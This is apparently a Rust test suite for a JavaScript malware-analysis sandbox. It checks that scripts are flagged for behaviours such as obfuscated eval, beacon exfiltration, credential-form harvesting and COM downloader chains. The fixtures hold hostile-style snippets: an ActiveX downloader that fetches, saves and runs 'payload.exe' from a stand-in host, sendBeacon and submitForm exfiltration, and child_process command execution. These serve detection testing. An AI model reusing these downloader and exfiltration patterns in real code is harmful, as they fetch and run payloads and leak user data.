use js_analysis::{DynamicOptions, DynamicOutcome, RuntimeKind, RuntimeMode, RuntimePhase};

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_skips_large_payload() {
    let options = DynamicOptions { max_bytes: 8, ..DynamicOptions::default() };
    let data = b"this is too large";
    let outcome = js_analysis::run_sandbox(data, &options);
    match outcome {
        DynamicOutcome::Skipped { reason, limit, actual } => {
            assert_eq!(reason, "payload_too_large");
            assert_eq!(limit, 8);
            assert_eq!(actual, data.len());
        }
        _ => panic!("expected skip"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_classifies_oversized_token_decoder_payload() {
    let options = DynamicOptions { max_bytes: 32, ..DynamicOptions::default() };
    let payload = b"/*@cc_on*/var x='a'['split']('!');for(i=0;i<x.length;i++){ }eval(x);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Skipped { reason, limit, actual } => {
            assert_eq!(reason, "payload_too_large_token_decoder");
            assert_eq!(limit, 32);
            assert_eq!(actual, payload.len());
        }
        _ => panic!("expected skip"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_skips_obfuscated_token_decoder_payload() {
    let options = DynamicOptions::default();
    let body = "A!".repeat(24_500);
    let payload = format!(
        "var U='';var V=\"{}\"[\"s\"+\"plit\"]('!');/*@cc_on\nfor(i=0;i<V.length;i++){{U+=V[i];}}\n@*/eval(U);",
        body
    );
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Skipped { reason, .. } => {
            assert_eq!(reason, "complex_token_decoder_payload");
        }
        _ => panic!("expected skip"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_exec_records_calls() {
    let options = DynamicOptions::default();
    let outcome = js_analysis::run_sandbox(b"app.alert('hi')", &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.calls.iter().any(|c| c == "alert"));
            assert!(signals.call_count >= 1);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_delta_summary_for_dynamic_code() {
    let options = DynamicOptions::default();
    let payload = br#"eval("var stageTwo = 7; app.alert('stage2');");"#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let delta = signals.delta_summary.expect("delta summary");
            assert!(
                delta.phase == "open"
                    || delta.phase == "idle"
                    || delta.phase == "click"
                    || delta.phase == "form"
            );
            assert!(delta.generated_snippets >= 1);
            assert!(delta.trigger_calls.iter().any(|call| call == "eval"));
            assert!(delta.added_identifier_count >= 1);
            assert!(
                delta.new_identifiers.iter().any(|value| value == "stageTwo")
                    || delta.new_calls.iter().any(|value| value == "alert")
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dormant_large_payloads() {
    let options = DynamicOptions::default();
    let payload = "/* large inert */".repeat(2_000);
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "dormant_or_gated_execution"),
                "expected dormant-or-gated pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dormant_marker_rich_mid_sized_payloads() {
    let options = DynamicOptions::default();
    let mut payload = "/*@cc_on*/".to_string();
    payload.push_str(&"A".repeat(9_000));
    payload.push_str("/* marker */eval('x');'abc'.split('').reverse().join('');");
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "dormant_or_gated_execution"),
                "expected dormant-or-gated pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_telemetry_budget_saturation() {
    let options = DynamicOptions::default();
    let payload = "for (var i = 0; i < 5000; i++) { app.alert('x'); }";
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "telemetry_budget_saturation"),
                "expected telemetry saturation pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_indirect_dynamic_eval_dispatch() {
    let options = DynamicOptions::default();
    let payload = br#"
        var root = Function('return this')();
        root['ev' + 'al'](\"app.alert('indirect')\");
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "indirect_dynamic_eval_dispatch"),
                "expected indirect dynamic eval dispatch pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_multi_pass_decode_pipeline() {
    let options = DynamicOptions::default();
    let payload = br#"
        var a = unescape('%61%6c%65%72%74%28%31%29');
        var b = unescape('%27%78%27');
        var c = String.fromCharCode(97,108,101,114,116,40,39,120,39,41);
        eval(a);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "multi_pass_decode_pipeline"),
                "expected multi-pass decode pipeline pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_timing_probe_evasion() {
    let options = DynamicOptions::default();
    let payload = br#"
        setTimeout(function(){}, 1);
        setInterval(function(){}, 2);
        WScript.Quit(1);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "timing_probe_evasion"),
                "expected timing probe evasion pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_capability_matrix_fingerprinting() {
    let options = DynamicOptions::default();
    let payload = br#"
        Object.keys(this);
        app.alert('x');
        navigator.sendBeacon('https://example.invalid/beacon');
        WScript.CreateObject('Scripting.FileSystemObject');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "capability_matrix_fingerprinting"),
                "expected capability matrix fingerprinting pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_covert_beacon_exfil() {
    let options = DynamicOptions::default();
    let payload = br#"
        var data = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        navigator.sendBeacon('https://ab12cd34ef56gh78ij90.example.invalid/track?d=' + data + data);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "covert_beacon_exfil"),
                "expected covert beacon exfil pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_prototype_chain_execution_hijack() {
    let options = DynamicOptions::default();
    let payload = br#"
        eval("Object.prototype._x='1';var o={};o.__proto__._y=2;");
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "prototype_chain_execution_hijack"),
                "expected prototype chain execution hijack pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wasm_loader_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        WebAssembly.Module('00');
        WebAssembly.instantiate('00');
        eval('1');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wasm_loader_staging"),
                "expected wasm loader staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_runtime_dependency_loader_abuse() {
    let options = DynamicOptions::default();
    let payload = br#"
        var cp = require('child_process');
        cp.exec('cmd.exe /c whoami');
        var fs = require('fs');
        fs.writeFileSync('tmp.txt', 'x');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "runtime_dependency_loader_abuse"),
                "expected runtime dependency loader abuse pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_credential_harvest_form_emulation() {
    let options = DynamicOptions::default();
    let payload = br#"
        addField('email');
        getField('email');
        submitForm('https://example.invalid/collect');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "credential_harvest_form_emulation"),
                "expected credential harvest form emulation pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_wasm_loader_staging_for_benign_wasm_absence() {
    let options = DynamicOptions::default();
    let payload = b"var x = 1 + 2; app.alert(x);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                !signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wasm_loader_staging"),
                "unexpected wasm loader staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_runtime_dependency_loader_abuse_for_single_safe_require() {
    let options = DynamicOptions::default();
    let payload = b"var path = require('path'); path.join('a','b');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                !signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "runtime_dependency_loader_abuse"),
                "unexpected runtime dependency loader abuse pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_does_not_flag_credential_harvest_for_field_reads_without_submission() {
    let options = DynamicOptions::default();
    let payload = b"addField('note'); getField('note');";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                !signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "credential_harvest_form_emulation"),
                "unexpected credential harvest pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_calibrates_downloader_chain_confidence_by_completeness() {
    let options = DynamicOptions::default();
    let full_chain = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/payload.exe', false);
        xhr.send();
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\payload.exe', 2);
        var shell = new ActiveXObject('WScript.Shell');
        shell.Run('C:\\Temp\\payload.exe', 0, false);
    "#;
    let partial_chain = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/payload.exe', false);
        xhr.send();
    "#;
    let full = js_analysis::run_sandbox(full_chain, &options);
    let partial = js_analysis::run_sandbox(partial_chain, &options);
    match (full, partial) {
        (DynamicOutcome::Executed(full_signals), DynamicOutcome::Executed(partial_signals)) => {
            let full_conf = full_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "com_downloader_execution_chain")
                .map(|pattern| pattern.confidence)
                .expect("full chain confidence");
            let partial_conf = partial_signals
                .behavioral_patterns
                .iter()
                .find(|pattern| pattern.name == "com_downloader_network_chain")
                .map(|pattern| pattern.confidence)
                .expect("partial chain confidence");
            assert!(full_conf > partial_conf, "full={} partial={}", full_conf, partial_conf);
            assert!(full_conf >= 0.70, "unexpectedly low full chain confidence: {}", full_conf);
            assert!(
                partial_conf <= 0.80,
                "unexpectedly high partial chain confidence: {}",
                partial_conf
            );
        }
        _ => panic!("expected executed outcomes"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_execution_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/payload.exe', false);
        xhr.send();
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\payload.exe', 2);
        stream.Close();
        var shell = new ActiveXObject('WScript.Shell');
        shell.Run('C:\\Temp\\payload.exe', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_execution_chain"),
                "expected COM downloader execution pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_staging_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/stage.bin', false);
        xhr.send();
        xhr.setRequestHeader('User-Agent', 'Mozilla/5.0');
        var stream = new ActiveXObject('ADODB.Stream');
        stream.Open();
        var shell = new ActiveXObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_staging_chain"),
                "expected COM downloader staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_network_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/dropper', false);
        xhr.send();
        var folder = WScript.CreateObject('Scripting.FileSystemObject');
        folder.CreateFolder('C:\\Temp\\cache');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_network_chain"),
                "expected COM downloader network pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_environment_gating() {
    let options = DynamicOptions::default();
    let payload = br#"
        var shell = WScript.CreateObject('WScript.Shell');
        shell.Environment('PROCESS').Item('COMPUTERNAME');
        shell.ExpandEnvironmentStrings('%TEMP%');
        WScript.Sleep(50);
        WScript.Quit(0);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_environment_gating"),
                "expected WSH environment gating pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_direct_execution_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = new ActiveXObject('MSXML2.XMLHTTP');
        xhr.open('GET', 'http://example.invalid/dropper.exe', false);
        xhr.send();
        var shell = new ActiveXObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
        shell.Run('http://example.invalid/dropper.exe', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_direct_execution_chain"),
                "expected COM downloader direct-execution pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_com_object_probe() {
    let options = DynamicOptions::default();
    let payload = br#"
        var obj = WScript.CreateObject('Scripting.FileSystemObject');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_com_object_probe"),
                "expected WSH COM probe pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_dormant_marked_small_payload() {
    let options = DynamicOptions::default();
    let payload = format!(
        "var markerA='ADODB.Stream';var markerB='ActiveXObject';var markerC='MSXML2.XMLHTTP.open';var padding='{}';",
        "X".repeat(4096)
    );
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "dormant_marked_small_payload"),
                "expected dormant marked small payload pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_file_drop_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        var stream = WScript.CreateObject('ADODB.Stream');
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\drop.bin', 2);
        stream.Close();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_file_drop_staging"),
                "expected COM file-drop staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_timing_gate() {
    let options = DynamicOptions::default();
    let payload = b"var gate='eval(' + 'x)'; WScript.Sleep(1);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals.behavioral_patterns.iter().any(|pattern| pattern.name == "wsh_timing_gate"),
                "expected WSH timing gate pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_incomplete_network_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        var shell = WScript.CreateObject('WScript.Shell');
        shell.ExpandEnvironmentStrings('%TEMP%');
        WScript.Sleep(1);
        xhr.send();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_incomplete_network_chain"),
                "expected incomplete downloader chain pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_send_only_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        xhr.send();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_send_only_chain"),
                "expected send-only downloader chain pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_incomplete_open_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        WScript.Sleep(1);
        xhr.open('GET', 'http://example.invalid/stage', false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_incomplete_open_chain"),
                "expected incomplete-open downloader pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_direct_run_execution() {
    let options = DynamicOptions::default();
    let payload = br#"
        var shell = WScript.CreateObject('WScript.Shell');
        shell.Run('cmd.exe /c calc.exe', 0, false);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_direct_run_execution"),
                "expected WSH direct-run pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_network_buffer_staging() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        var stream = WScript.CreateObject('ADODB.Stream');
        xhr.send();
        stream.Open();
        stream.Write('MZ');
        stream.Close();
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_network_buffer_staging"),
                "expected COM network-buffer staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_com_downloader_partial_staging_chain() {
    let options = DynamicOptions::default();
    let payload = br#"
        var xhr = WScript.CreateObject('MSXML2.XMLHTTP');
        var stream = WScript.CreateObject('ADODB.Stream');
        xhr.send();
        stream.Open();
        stream.Write('MZ');
        stream.SaveToFile('C:\\Temp\\drop.bin', 2);
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "com_downloader_partial_staging_chain"),
                "expected COM partial staging pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_filesystem_recon_probe() {
    let options = DynamicOptions::default();
    let payload = br#"
        var fso = new ActiveXObject('Scripting.FileSystemObject');
        fso.GetFile('C:\\Windows\\System32\\cmd.exe');
    "#;
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_filesystem_recon_probe"),
                "expected WSH filesystem recon pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_early_quit_gate() {
    let options = DynamicOptions::default();
    let payload = b"var marker='split(' + 'x)'; WScript.Quit(1);";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_early_quit_gate"),
                "expected WSH early-quit gate pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_flags_wsh_sleep_only_execution() {
    let options = DynamicOptions::default();
    let payload = format!("WScript.Sleep(1);{}", "A".repeat(5000));
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals
                    .behavioral_patterns
                    .iter()
                    .any(|pattern| pattern.name == "wsh_sleep_only_execution"),
                "expected WSH sleep-only pattern: {:?}",
                signals.behavioral_patterns
            );
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_omits_delta_summary_without_dynamic_code() {
    let options = DynamicOptions::default();
    let outcome = js_analysis::run_sandbox(b"app.alert('hello')", &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.delta_summary.is_none());
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_emits_phase_scoped_telemetry() {
    let options = DynamicOptions::default();
    let payload = b"
        function onIdle() { app.alert('idle'); }
        function onClick() { app.alert('click'); }
        function onSubmit() { app.alert('form'); }
        app.alert('open');
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let phase_names =
                signals.phases.iter().map(|phase| phase.phase.as_str()).collect::<Vec<_>>();
            assert_eq!(phase_names, vec!["open", "idle", "click", "form"]);
            for phase in &signals.phases {
                assert!(phase.elapsed_ms <= options.phase_timeout_ms);
            }
            let open =
                signals.phases.iter().find(|phase| phase.phase == "open").expect("open phase");
            let click =
                signals.phases.iter().find(|phase| phase.phase == "click").expect("click phase");
            let form =
                signals.phases.iter().find(|phase| phase.phase == "form").expect("form phase");
            assert!(open.call_count >= 1);
            assert!(click.call_count >= 1);
            assert!(form.call_count >= 1);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_respects_custom_phase_selection() {
    let mut options = DynamicOptions::default();
    options.phases = vec![RuntimePhase::Open, RuntimePhase::Idle];
    let payload = b"function onIdle(){app.alert('idle')} app.alert('open')";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            let phase_names =
                signals.phases.iter().map(|phase| phase.phase.as_str()).collect::<Vec<_>>();
            assert_eq!(phase_names, vec!["open", "idle"]);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_replay_id_is_stable_for_same_input() {
    let options = DynamicOptions::default();
    let payload = b"app.alert('stable');";
    let first = js_analysis::run_sandbox(payload, &options);
    let second = js_analysis::run_sandbox(payload, &options);
    match (first, second) {
        (DynamicOutcome::Executed(a), DynamicOutcome::Executed(b)) => {
            assert_eq!(a.replay_id, b.replay_id);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_replay_id_differs_for_different_inputs() {
    let options = DynamicOptions::default();
    let first = js_analysis::run_sandbox(b"app.alert('a')", &options);
    let second = js_analysis::run_sandbox(b"app.alert('b')", &options);
    match (first, second) {
        (DynamicOutcome::Executed(a), DynamicOutcome::Executed(b)) => {
            assert_ne!(a.replay_id, b.replay_id);
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_executes_lifecycle_micro_phase_when_context_configured() {
    let options = DynamicOptions {
        lifecycle_context: Some(js_analysis::types::LifecycleContext::NpmInstall),
        runtime_profile: js_analysis::types::RuntimeProfile {
            kind: js_analysis::types::RuntimeKind::Node,
            vendor: "nodejs".to_string(),
            version: "20".to_string(),
            mode: js_analysis::types::RuntimeMode::Compat,
        },
        ..DynamicOptions::default()
    };
    let payload = b"
        function install() {
            require('child_process');
            child_process.exec('echo test');
        }
    ";
    let outcome = js_analysis::run_sandbox(payload, &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(
                signals.phases.iter().any(|phase| phase.phase == "npm.install"),
                "expected npm.install phase in {:?}",
                signals.phases
            );
            assert!(signals.calls.iter().any(|call| call == "child_process.exec"));
        }
        _ => panic!("expected executed"),
    }
}

#[cfg(feature = "js-sandbox")]
#[test]
fn sandbox_tracks_truncation_invariants() {
    let options = DynamicOptions::default();
    let mut payload = String::from("for (var i = 0; i < 2600; i++) {");
    payload.push_str("app.alert(i);");
    payload.push_str("fetch('https://example.test/' + i);");
    payload.push_str("}");
    let outcome = js_analysis::run_sandbox(payload.as_bytes(), &options);
    match outcome {
        DynamicOutcome::Executed(signals) => {
            assert!(signals.truncation.calls_dropped > 0);
            assert!(signals.truncation.call_args_dropped > 0);
            assert!(signals.truncation.urls_dropped > 0);
            assert!(signals.truncation.domains_dropped > 0);
            assert!(signals.calls.len() <= 2_048);
            assert!(signals.urls.len() <= options.max_urls);
            assert!(signals.domains.len() <= options.max_domains);
            assert!(signals.call_args.len() <= options.max_call_args);
        }
